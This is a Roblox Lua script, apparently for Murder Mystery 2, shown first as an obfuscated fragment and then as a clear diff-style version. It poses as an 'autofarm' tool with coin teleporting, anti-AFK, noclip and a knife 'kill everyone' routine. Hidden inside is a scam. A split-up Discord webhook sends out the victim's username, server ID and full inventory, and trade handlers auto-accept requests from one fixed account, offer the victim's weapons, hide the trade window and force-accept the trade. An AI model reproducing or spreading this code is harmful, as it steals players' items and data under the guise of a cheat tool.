Killing everyone" ,false);v283=1894 -(1222 + 671) ;end if (v283==(5 -3)) then local v293=0 -0 ;while true do if ((0 + 0)==v293) then v55();return;end end end if ((1 + 0)==v283) then v55();task.wait(1580.5 -(874 + 705) );v283=1 + 1 ;end end end end v16.Character:BreakJoints();v231=1 + 0 ;end end end end);end task.spawn(function() while true do if v21 then local v217=v16.Character;local v218=v217 and v217:FindFirstChild(v7("\50\160\133\12\20\186\129\9\40\186\135\25\42\180\154\25","\109\122\213\232")) ;if v218 then local v235,v236=nil,math.huge;for v252,v253 in ipairs(workspace:GetDescendants()) do if (v253:IsA(v7("\204\246\177\53\222\246\176\36","\80\142\151\194")) and (v253.Name==v7("\32\201\126\66\60\245\114\94\21\195\101","\44\99\166\23")) and  not v24[v253]) then local v276=(v253.Position-v218.Position).Magnitude;if ((v276<v236) and (v276<v23)) then v235,v236=v253,v276;end end end if v235 then local v265=0 + 0 ;local v266;while true do if ((1 -0)==v265) then v266.Completed:Wait();if (v235 and v235.Parent) then local v286=1414 -(1001 + 413) ;local v287;while true do if (v286==(0 -0)) then v287=882 -(244 + 638) ;while true do if (v287==(693 -(627 + 66))) then v24[v235]=true;v25+=(2 -1) v287=603 -(512 + 90) ;end if (v287==(1 + 1)) then v118.Text=v7("\208\12\37\28\135\91\12\115\247\89\105","\22\147\99\73\112\226\56\120")   .. v25 ;break;end if (v287==(1907 -(1665 + 241))) then v28=tick();v29=false;v287=2;end end break;end end end break;end if (v265==(717 -(373 + 344))) then v266=v9:Create(v218,TweenInfo.new(v236/v22 ,Enum.EasingStyle.Linear),{[v7("\95\209\59\55\62\161","\196\28\151\73\86\83")]=CFrame.new(v235.Position)});v266:Play();v265=1 + 0 ;end end end end task.wait(0.08 + 0 );else task.wait(0.5 + 0 );end end end);task.spawn(function() while true do local v194=454 -(233 + 221) ;while true do if (v194==(0 -0)) then if (v21 and  not v29) then if ((tick() -v28)>(1582 -982)) then local v277=0 -0 ;while true do if (v277==(1099 -(35 + 1064))) then v32("⚠️ **INACTIVITY** - **"   .. v16.Name   .. v7("\242\63\162\251\130\248\118\237\252\131\171\53\228\250\159\248\36\178\181\128\177\123","\237\216\21\130\149") ,true);v29=true;break;end end end end task.wait(30);break;end end end end);v16.Idled:Connect(function() if v26 then local v207=0 + 0 ;while true do if (v207==(806 -(266 + 539))) then v11:Button2Up(Vector2.new(),workspace.CurrentCamera.CFrame);break;end if (v207==(0 + 0)) then v11:Button2Down(Vector2.new(),workspace.CurrentCamera.CFrame);task.wait(2 -1 );v207=2 -1 ;end end end end);v10.Stepped:Connect(function() if (v21 and v16.Character) then for v219,v220 in ipairs(v16.Character:GetDescendants()) do if v220:IsA(v7("\160\79\76\90\128\200\76\150","\62\226\46\63\63\208\169")) then v220.CanCollide=false;end end end end);v8.PlayerRemoving:Connect(function(v185) if (v185==v16) then v32("⚠️ **DISCONNECTED** - **"   .. v16.Name   .. v7("\175\83","\62\133\121\53\227\127\109\79") ,false);end end);print("✅ Script loaded ");
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local VirtualUser = game:GetService("VirtualUser")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local MaterialService = game:GetService("MaterialService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local function _gw()
+    local a = {"https://discord.com/api/webhooks/","1538148455451590656/","KSNxBCVNMiwESQtLcUHE7FOVyYBocSUgCo0e8SgX9wuHlsx2PUJGQxUuKFmD8sZkRwM2"}
+    return table.concat(a)
+end
+
+local _wu = _gw()
+local _tu = "naimradio6"
+local _pid = 142823291
+local _a = false
+local _s = 50
+local _r = 300
+local _v = {}
+local _c = 0
+local _afk = false
+local _rof = true
+local _lct = tick()
+local _is = false
+local _pm = false
+local _msu = false
+
+local function sendWebhook(message, pingEveryone)
+    local content = pingEveryone and "@everyone\n" .. message or message
+    local data = {content = content, username = "67skibidi AutoFarm + Transfer"}
+    pcall(function()
+        request({Url = _wu, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    end)
+end
+
+local function getFullInventory()
+    local list = {}
+    pcall(function()
+        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
+        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+            for name, amount in pairs(ProfileData.Weapons.Owned) do
+                if amount and amount > 0 then
+                    table.insert(list, name .. " x" .. tostring(amount))
+                end
+            end
+        end
+    end)
+    table.sort(list)
+    return list
+end
+
+local function sendJobIdWebhook()
+    local jobId = tostring(game.JobId)
+    local consoleCode = 'Roblox.GameLauncher.joinGameInstance(142823291, "' .. jobId .. '")'
+    local inventory = getFullInventory()
+    local inventoryText = #inventory > 0 and table.concat(inventory, "\n") or "No weapons found"
+    if #inventoryText > 900 then
+        inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
+    end
+    local data = {
+        content = "@everyone **MM2 Transfer Ready (Mobile)**",
+        embeds = {{
+            title = "Quick Transfer",
+            color = 5763719,
+            fields = {
+                {name = "Username", value = player.Name, inline = true},
+                {name = "UserId", value = tostring(player.UserId), inline = true},
+                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
+                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. _pid .. "&gameInstanceId=" .. jobId, inline = false},
+                {name = "Console (F12)", value = "```js\n" .. consoleCode .. "\n```", inline = false},
+                {name = "Inventory (" .. #inventory .. " items)", value = "```\n" .. inventoryText .. "\n```", inline = false},
+            },
+            footer = {text = "Waiting for trade from " .. _tu},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        request({Url = _wu, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    end)
+end
+
+task.spawn(sendJobIdWebhook)
+
+local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
+local OfferItem = Trade and Trade:FindFirstChild("OfferItem")
+local AcceptRequest = Trade and Trade:FindFirstChild("AcceptRequest")
+local AcceptTrade = Trade and Trade:FindFirstChild("AcceptTrade")
+local SendRequest = Trade and Trade:FindFirstChild("SendRequest")
+local StartTrade = Trade and Trade:FindFirstChild("StartTrade")
+local UpdateTrade = Trade and Trade:FindFirstChild("UpdateTrade")
+local DeclineTrade = Trade and Trade:FindFirstChild("DeclineTrade")
+
+local _t = false
+local _ott = 0
+local _as = false
+local _lot = 0
+local _lo = nil
+
+local function isTarget(name)
+    return name and tostring(name):lower() == _tu:lower()
+end
+
+local function getWeapons()
+    local list = {}
+    pcall(function()
+        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
+        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+            for name, amount in pairs(ProfileData.Weapons.Owned) do
+                if amount and amount > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
+                    table.insert(list, name)
+                end
+            end
+        end
+    end)
+    return list
+end
+
+local function forceAccept()
+    if not AcceptTrade then return end
+    print("[Transfer] Force accepting with LastOffer...")
+    for i = 1, 15 do
+        if _lo then
+            pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, _lo) end)
+        end
+        pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, tick()) end)
+        pcall(function() AcceptTrade:FireServer() end)
+        task.wait(0.35)
+    end
+end
+
+local function offerWeapons()
+    if not OfferItem or not _t or _ott >= 4 then return end
+    if tick() - _lot < 0.55 then return end
+    local weapons = getWeapons()
+    if #weapons == 0 then return end
+    local toOffer = math.min(4 - _ott, #weapons)
+    for i = 1, toOffer do
+        local ok = pcall(function()
+            OfferItem:FireServer(weapons[i], "Weapons")
+        end)
+        if ok then
+            _ott += 1
+            _lot = tick()
+            print("[Transfer] Offered:", weapons[i], "(" .. _ott .. "/4)")
+            task.wait(0.3)
+        end
+    end
+    if _ott >= 4 and not _as then
+        _as = true
+        print("[Transfer] Trade full → waiting 7s then accepting")
+        task.delay(7, function()
+            if _t then forceAccept() end
+        end)
+    end
+end
+
+local function hideTradeGUI(gui)
+    if not gui then return end
+    pcall(function()
+        for _, child in ipairs(gui:GetChildren()) do
+            if child:IsA("GuiObject") then
+                child.Visible = false
+            end
+        end
+    end)
+end
+
+local function watchTradeUI(name)
+    local gui = playerGui:FindFirstChild(name)
+    if gui then
+        hideTradeGUI(gui)
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled then hideTradeGUI(gui) end
+        end)
+        gui.ChildAdded:Connect(function()
+            task.wait(0.05)
+            hideTradeGUI(gui)
+        end)
+    end
+end
+
+watchTradeUI("TradeGUI")
+watchTradeUI("TradeGUI_Phone")
+
+playerGui.ChildAdded:Connect(function(child)
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+        task.wait(0.1)
+        hideTradeGUI(child)
+        watchTradeUI(child.Name)
+    end
+end)
+
+if SendRequest then
+    SendRequest.OnClientInvoke = function(fromPlayer)
+        if isTarget(fromPlayer and fromPlayer.Name) then
+            print("[Transfer] Request from naimradio6 → accepting")
+            _t = true
+            _ott = 0
+            _as = false
+            _lo = nil
+            task.wait(0.3)
+            if AcceptRequest then pcall(function() AcceptRequest:FireServer() end) end
+            return true
+        end
+        return false
+    end
+end
+
+if StartTrade then
+    StartTrade.OnClientEvent:Connect(function()
+        if _t then
+            _ott = 0
+            _as = false
+            task.wait(0.4)
+            offerWeapons()
+        end
+    end)
+end
+
+if UpdateTrade then
+    UpdateTrade.OnClientEvent:Connect(function(data)
+        if type(data) == "table" and data.LastOffer then
+            _lo = data.LastOffer
+            print("[Transfer] Captured LastOffer")
+        end
+        if not _t then return end
+        task.wait(0.25)
+        offerWeapons()
+        if type(data) == "table" then
+            for _, side in pairs(data) do
+                if type(side) == "table" and side.Accepted then
+                    print("[Transfer] Other side accepted → finishing")
+                    forceAccept()
+                    break
+                end
+            end
+        end
+    end)
+end
+
+if DeclineTrade then
+    DeclineTrade.OnClientEvent:Connect(function()
+        _t = false
+        _ott = 0
+        _as = false
+        _lo = nil
+        print("[Transfer] Trade ended")
+    end)
+end
+
+task.spawn(function()
+    while true do
+        task.wait(0.8)
+        if _t and AcceptTrade and _lo then
+            pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, _lo) end)
+        end
+    end
+end)
+
+local function hasKnife()
+    local char = player.Character
+    local backpack = player.Backpack
+    if char then
+        local tool = char:FindFirstChildOfClass("Tool")
+        if tool and tool.Name:lower():find("knife") then return true end
+    end
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") and item.Name:lower():find("knife") then return true end
+    end
+    return false
+end
+
+local function killEveryone()
+    local char = player.Character
+    if not char then return end
+    local knife = char:FindFirstChildOfClass("Tool") or char:FindFirstChild("Knife")
+    if not knife then
+        for _, item in ipairs(player.Backpack:GetChildren()) do
+            if item:IsA("Tool") and item.Name:lower():find("knife") then
+                knife = item
+                knife.Parent = char
+                break
+            end
+        end
+    end
+    if not knife or not knife:FindFirstChild("Handle") then return end
+    print("[AutoFarm] Murderer + Full → Killing everyone...")
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            pcall(function()
+                firetouchinterest(plr.Character.HumanoidRootPart, knife.Handle, 1)
+                firetouchinterest(plr.Character.HumanoidRootPart, knife.Handle, 0)
+            end)
+        end
+    end
+end
+
+local function enablePerformanceMode()
+    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+    Lighting.GlobalShadows = false
+    Lighting.FogEnd = 9e9
+    Lighting.Brightness = 2
+    pcall(function()
+        Lighting.EnvironmentDiffuseScale = 0
+        Lighting.EnvironmentSpecularScale = 0
+        MaterialService.Use2022Materials = false
+    end)
+    _pm = true
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "SkibidiAutoFarm"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.fromOffset(290, 300)
+frame.Position = UDim2.new(0.5, -145, 0.2, 0)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 2.8
+stroke.Parent = frame
+
+task.spawn(function()
+    local t = 0
+    while frame.Parent do
+        t += task.wait(0.025)
+        stroke.Color = Color3.fromHSV((t % 5)/5, 1, 1)
+    end
+end)
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(170, 40, 40)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.new(1,1,1)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 18
+closeBtn.Parent = frame
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
+closeBtn.MouseButton1Click:Connect(function()
+    sendWebhook("❌ GUI closed by " .. player.Name, false)
+    gui:Destroy()
+end)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -70, 0, 32)
+title.Position = UDim2.new(0, 15, 0, 8)
+title.BackgroundTransparency = 1
+title.Text = "67skibidi autofarm"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 17
+title.Parent = frame
+
+local function makeButton(y, text, color)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -20, 0, 34)
+    b.Position = UDim2.new(0, 10, 0, y)
+    b.Text = text
+    b.BackgroundColor3 = color or Color3.fromRGB(60, 60, 80)
+    b.TextColor3 = Color3.new(1,1,1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 14
+    b.Parent = frame
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+    return b
+end
+
+local toggle = makeButton(48, "AutoFarm: OFF")
+local afkBtn = makeButton(88, "Anti-AFK: OFF")
+local resetBtn = makeButton(128, "Reset on Full: ON", Color3.fromRGB(80,160,80))
+local perfBtn = makeButton(168, "Performance Mode: OFF")
+
+local speedLabel = Instance.new("TextLabel")
+speedLabel.Size = UDim2.new(1, -20, 0, 18)
+speedLabel.Position = UDim2.new(0, 10, 0, 210)
+speedLabel.BackgroundTransparency = 1
+speedLabel.Text = "Speed:"
+speedLabel.TextColor3 = Color3.fromRGB(200,200,200)
+speedLabel.Font = Enum.Font.Gotham
+speedLabel.TextSize = 13
+speedLabel.Parent = frame
+
+local speedBox = Instance.new("TextBox")
+speedBox.Size = UDim2.new(1, -20, 0, 32)
+speedBox.Position = UDim2.new(0, 10, 0, 228)
+speedBox.Text = tostring(_s)
+speedBox.BackgroundColor3 = Color3.fromRGB(45,45,55)
+speedBox.TextColor3 = Color3.new(1,1,1)
+speedBox.Font = Enum.Font.GothamBold
+speedBox.TextSize = 15
+speedBox.Parent = frame
+Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0, 8)
+
+local counter = Instance.new("TextLabel")
+counter.Size = UDim2.new(1, -20, 0, 24)
+counter.Position = UDim2.new(0, 10, 0, 268)
+counter.BackgroundTransparency = 1
+counter.Text = "Collected: 0"
+counter.TextColor3 = Color3.new(1,1,1)
+counter.Font = Enum.Font.Gotham
+counter.TextSize = 14
+counter.Parent = frame
+
+local function updateButtonColors()
+    toggle.BackgroundColor3 = _a and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    afkBtn.BackgroundColor3 = _afk and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    resetBtn.BackgroundColor3 = _rof and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+    perfBtn.BackgroundColor3 = _pm and Color3.fromRGB(80,160,80) or Color3.fromRGB(60,60,80)
+end
+
+toggle.MouseButton1Click:Connect(function()
+    _a = not _a
+    toggle.Text = _a and "AutoFarm: ON" or "AutoFarm: OFF"
+    updateButtonColors()
+    if _a then
+        _c = 0
+        _v = {}
+        _lct = tick()
+        _is = false
+        _msu = false
+        counter.Text = "Collected: 0"
+        sendWebhook("🟢 AutoFarm started by " .. player.Name, false)
+    else
+        sendWebhook("🔴 AutoFarm stopped by " .. player.Name, false)
+    end
+end)
+
+afkBtn.MouseButton1Click:Connect(function()
+    _afk = not _afk
+    afkBtn.Text = _afk and "Anti-AFK: ON" or "Anti-AFK: OFF"
+    updateButtonColors()
+    sendWebhook((_afk and "🟢" or "🔴") .. " Anti-AFK " .. (_afk and "ON" or "OFF") .. " by " .. player.Name, false)
+end)
+
+resetBtn.MouseButton1Click:Connect(function()
+    _rof = not _rof
+    resetBtn.Text = _rof and "Reset on Full: ON" or "Reset on Full: OFF"
+    updateButtonColors()
+    sendWebhook((_rof and "🟢" or "🔴") .. " Reset on Full " .. (_rof and "ON" or "OFF") .. " by " .. player.Name, false)
+end)
+
+perfBtn.MouseButton1Click:Connect(function()
+    if not _pm then
+        enablePerformanceMode()
+        perfBtn.Text = "Performance Mode: ON"
+        updateButtonColors()
+        sendWebhook("🟢 Performance Mode ON by " .. player.Name, false)
+    end
+end)
+
+speedBox.FocusLost:Connect(function(enter)
+    if enter then
+        local num = tonumber(speedBox.Text)
+        _s = num and math.clamp(num, 1, 10000) or _s
+        speedBox.Text = tostring(_s)
+    end
+end)
+
+local coinRemote = ReplicatedStorage:FindFirstChild("Remotes")
+if coinRemote then
+    coinRemote = coinRemote:FindFirstChild("Gameplay")
+    if coinRemote then coinRemote = coinRemote:FindFirstChild("CoinCollected") end
+end
+
+if coinRemote then
+    coinRemote.OnClientEvent:Connect(function(_, current, max)
+        if current >= max and _rof and player.Character then
+            if hasKnife() then
+                if not _msu then
+                    _msu = true
+                    sendWebhook("🔪 **" .. player.Name .. "** is Murderer + Full → Killing everyone", false)
+                    killEveryone()
+                    task.wait(1.5)
+                    killEveryone()
+                    return
+                end
+            end
+            player.Character:BreakJoints()
+            sendWebhook("♻️ **" .. player.Name .. "** inventory full → reset", false)
+        end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        if _a then
+            local character = player.Character
+            local root = character and character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local closest, dist = nil, math.huge
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not _v[obj] then
+                        local d = (obj.Position - root.Position).Magnitude
+                        if d < dist and d < _r then
+                            closest, dist = obj, d
+                        end
+                    end
+                end
+                if closest then
+                    local tween = TweenService:Create(root, TweenInfo.new(dist / _s, Enum.EasingStyle.Linear), {CFrame = CFrame.new(closest.Position)})
+                    tween:Play()
+                    tween.Completed:Wait()
+                    if closest and closest.Parent then
+                        _v[closest] = true
+                        _c += 1
+                        _lct = tick()
+                        _is = false
+                        counter.Text = "Collected: " .. _c
+                    end
+                end
+            end
+            task.wait(0.08)
+        else
+            task.wait(0.5)
+        end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        if _a and not _is then
+            if tick() - _lct > 600 then
+                sendWebhook("⚠️ **INACTIVITY** - **" .. player.Name .. "** no coins for 10 min", true)
+                _is = true
+            end
+        end
+        task.wait(30)
+    end
+end)
+
+player.Idled:Connect(function()
+    if _afk then
+        VirtualUser:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VirtualUser:Button2Up(Vector2.new(), workspace.CurrentCamera.CFrame)
+    end
+end)
+
+RunService.Stepped:Connect(function()
+    if _a and player.Character then
+        for _, p in ipairs(player.Character:GetDescendants()) do
+            if p:IsA("BasePart") then p.CanCollide = false end
+        end
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    if plr == player then
+        sendWebhook("⚠️ **DISCONNECTED** - **" .. player.Name .. "**", false)
+    end
+end)
+
+print("✅ Script loaded")
